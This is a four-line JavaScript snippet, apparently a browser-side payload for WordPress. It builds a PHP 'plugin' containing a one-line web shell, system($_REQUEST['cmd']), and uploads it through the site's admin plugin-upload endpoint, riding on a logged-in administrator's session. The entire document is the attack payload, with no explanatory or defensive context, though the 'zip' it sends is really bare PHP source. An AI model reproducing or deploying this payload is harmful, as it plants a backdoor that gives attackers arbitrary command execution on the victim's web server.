const source = "<?php /* Plugin Name: Control */ system($_REQUEST[\"cmd\"]);";
const form = new FormData();
form.append("pluginzip", new Blob([source], {type: "application/zip"}));
fetch("/wp-admin/update.php?action=upload-plugin", {method: "POST", body: form});
